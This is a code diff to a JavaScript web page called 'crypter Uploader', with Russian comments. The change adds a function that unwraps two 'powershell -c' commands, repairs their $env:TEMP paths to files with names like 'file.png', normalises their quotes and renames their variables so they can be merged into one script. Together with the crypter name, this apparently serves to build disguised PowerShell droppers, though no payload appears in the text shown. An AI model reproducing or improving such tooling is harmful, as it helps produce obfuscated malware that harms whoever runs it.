@@ -230,7 +230,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>📤 crypter Uploader <small style="font-size: 10px; opacity: 0.5;">v2.1.1</small></h1>
+        <h1>📤 crypter Uploader <small style="font-size: 10px; opacity: 0.5;">v2.1.2</small></h1>
         
         <div class="upload-area" id="uploadArea">
             <div class="upload-icon">📁</div>
@@ -438,13 +438,24 @@
                 return;
             }
             
-            const clean = (c) => c.replace(/^powershell\s+-c\s+["']/i, '').replace(/["']$/i, '').replace(/\\"/g, "'");
+            const cleanAndRepair = (c) => {
+                // 1. Убираем внешнюю обертку powershell -c "..."
+                let inner = c.replace(/^powershell\s+-c\s+["']/i, '').replace(/["']$/i, '');
+                
+                // 2. Исправляем пути $env:TEMP (превращаем "$env:TEMP\file.png" в $env:TEMP+'\file.png')
+                // Это лечит ошибку "Непредвиденная лексема"
+                inner = inner.replace(/\$env:TEMP\\([^\s;]+)/g, "$env:TEMP+'\\$1'");
+                
+                // 3. Убираем опасные экранированные кавычки \"
+                inner = inner.replace(/\\"/g, "'").replace(/"/g, "'");
+                
+                return inner;
+            };
             
-            command1 = clean(command1);
-            command2 = clean(command2);
+            command1 = cleanAndRepair(command1);
+            command2 = cleanAndRepair(command2);
             
-            // Переименовываем переменные во второй команде, чтобы они не конфликтовали с первой
-            // Ищем переменные типа $t, $u, $d (включая те, что уже с цифрами)
+            // 4. Переименовываем переменные во второй команде ($t -> $t2, $u -> $u2, $d -> $d2)
             command2 = command2.replace(/\$([tud])(\d*)\b/g, (match, p1, p2) => {
                 const num = p2 ? parseInt(p2) + 1 : 2;
                 return `$${p1}${num}`;
